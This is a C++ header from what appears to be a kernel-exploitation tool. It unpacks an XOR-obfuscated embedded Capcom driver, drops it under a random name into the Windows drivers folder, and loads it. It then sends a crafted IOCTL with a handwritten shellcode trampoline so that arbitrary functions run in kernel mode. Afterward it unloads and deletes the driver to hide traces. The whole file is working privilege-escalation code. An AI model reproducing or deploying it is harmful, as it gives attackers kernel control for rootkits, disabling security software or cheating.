#pragma once
#include <filesystem>
#include <iostream>
#include <fstream>

#include "CapcomResource.h"
#include "DriverLoader.h"
#include "LockedMemory.h"

#define IOCTL_RunPayload64 0xAA013044

#pragma pack(push, 1)
struct CapcomContext
{
	using FnCapcomCb = void( __stdcall*)( PVOID );
	using FnCapcomCbNoCtx = void(__stdcall*)();

	uint64_t BufferPointer;
	uint8_t MovabsRaxData[ 0x2 ] = { 0x48, 0xB8 };		// mov rax, data
	uint64_t DataSource;								// -
	uint8_t MovRdxRax[ 0x3 ] = { 0x48, 0x89, 0xC1 };	// mov rcx, rax
	uint8_t MovabsRax[ 0x2 ] = { 0x48, 0xB8 };			// mov rax, destination
	uint64_t Destination;								// -
	uint8_t JmpRax[ 0x2 ] = { 0xFF, 0xE0 };				// jmp rax

	HANDLE CapcomDevice;
	std::wstring CapcomDriverName;

	CapcomContext( std::wstring DriverName, HANDLE Device )
	{
		this->CapcomDriverName = DriverName;
		this->CapcomDevice = Device;
	}

	void ExecuteInKernel( FnCapcomCb Destination, PVOID Ctx = 0 )
	{
		this->Destination = ( uint64_t ) Destination;

		// STOP OPTIMIZING MY FUCKING VARIABLES AWAY DUMB CUNT
		if ( __rdtsc() == 0 )
			Destination( 0 );

		DWORD Status = 0x0;
		DWORD BytesReturned = 0x0;
		this->DataSource = ( uint64_t ) Ctx;
		this->BufferPointer = ( uint64_t ) ( &this->BufferPointer + 1 );

		DeviceIoControl
		(
			CapcomDevice,
			IOCTL_RunPayload64,
			&this->BufferPointer,
			sizeof( uint64_t ),
			&Status,
			sizeof( Status ),
			&BytesReturned,
			0
		);
	}

	void ExecuteInKernel( FnCapcomCbNoCtx Fn, PVOID Ctx = 0 )
	{
		this->ExecuteInKernel( ( FnCapcomCb )( Fn ), Ctx );
	}
};
#pragma pack(pop)

static void Cl_AssertDecrypted()
{
	if ( CAPCOM_DRIVER[ 0 ] != 0x4D )
	{
		for ( BYTE& b : CAPCOM_DRIVER )
			b ^= CAPCOM_DRIVER_XOR_KEY;
	}
}

static std::wstring Cl_GetDriverPath()
{
	wchar_t SystemDirectory[ 2048 ];
	GetSystemDirectoryW( SystemDirectory, 2048 );

	std::wstring DriverPath = SystemDirectory;
	DriverPath += L"\\drivers\\";

	return DriverPath;
}

static NTSTATUS Cl_RemoveSimilarDrivers( BYTE* Driver )
{
	namespace fs = std::experimental::filesystem;

	std::wstring DriverPath = Cl_GetDriverPath();

	NTSTATUS Status = STATUS_SUCCESS;

	for ( auto& File : fs::directory_iterator( DriverPath ) )
	{
		std::wstring Path = File.path();
		if ( Path.find( L".sys" ) != -1 )
		{
			std::ifstream FileStr( File, std::ios::binary );
			char Data[ 1024 ];
			FileStr.read( Data, 1024 );
			FileStr.close();

			if ( !memcmp( Driver, Data, 1024 ) )
			{
				bool Deleted = DeleteFileW( Path.c_str() );

				printf( "[+] DeleteFile (%ls) : %x\n", Path.c_str(), Deleted );

				if ( !Deleted )
				{
					int StrEnd = Path.find( L".sys" );
					int StrStart = Path.rfind( L"\\", StrEnd );
					std::wstring DriverName = Path.substr( StrStart + 1, StrEnd - StrStart - 1 ).c_str();
					Dl_UnloadDriver( DriverName.c_str() );

					Deleted = DeleteFileW( Path.c_str() );
					printf( "[+] DeleteFile2 (%ls) : %x\n", Path.c_str(), Deleted );
				}

				Status |= !Deleted;
			}
		}
	}

	return Status;
}

static BOOL Cl_FreeContext( CapcomContext* Ctx )
{
	Cl_AssertDecrypted();
	CloseHandle( Ctx->CapcomDevice );
	if ( Dl_UnloadDriver( Ctx->CapcomDriverName.c_str() ) )
		return FALSE;
	if ( Cl_RemoveSimilarDrivers( CAPCOM_DRIVER ) )
		return FALSE;
	VirtualFree( Ctx, 0, MEM_FREE );
	return TRUE;
}

static CapcomContext* Cl_InitContext()
{
	Cl_AssertDecrypted();

	CapcomContext* AllocatedContext = ( CapcomContext* ) ( VirtualAlloc( 0, sizeof( CapcomContext ), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) );

	std::wstring CapcomDriverName = L"";

	srand( __rdtsc() );
	
	for ( int i = 0; i < 12; i++ )
		CapcomDriverName += wchar_t( L'A' + rand() % 20 );

	std::wstring DriverPath = Cl_GetDriverPath() + CapcomDriverName + L".sys";
	
	if ( Cl_RemoveSimilarDrivers( CAPCOM_DRIVER ) )
	{
		printf( "[+] Failed to remove similar drivers!\n" );
		VirtualFree( AllocatedContext, 0, MEM_FREE );
		return 0;
	}

	std::ofstream file( DriverPath, std::ios::binary );
	
	if ( !file.good() )
	{
		printf( "[+] Failed to create file!\n" );
		VirtualFree( AllocatedContext, 0, MEM_FREE );
		return 0;
	}

	file.write( ( char* ) CAPCOM_DRIVER, sizeof( CAPCOM_DRIVER ) );
	file.close();

	if ( Dl_LoadDriver( CapcomDriverName.c_str() ) )
	{
		printf( "[+] Failed to load driver!\n" );
		while ( 1 );
		Cl_RemoveSimilarDrivers( CAPCOM_DRIVER );
		VirtualFree( AllocatedContext, 0, MEM_FREE );
		return 0;
	}

	HANDLE Device = Dl_OpenDevice( "Htsysm72FB" );

	if ( !Device )
	{
		printf( "[+] Failed to open device!\n" );
		Dl_UnloadDriver( CapcomDriverName.c_str() );
		Cl_RemoveSimilarDrivers( CAPCOM_DRIVER );
		VirtualFree( AllocatedContext, 0, MEM_FREE );
		return 0;
	}

	new ( AllocatedContext ) CapcomContext( CapcomDriverName, Device );
	return AllocatedContext;
}
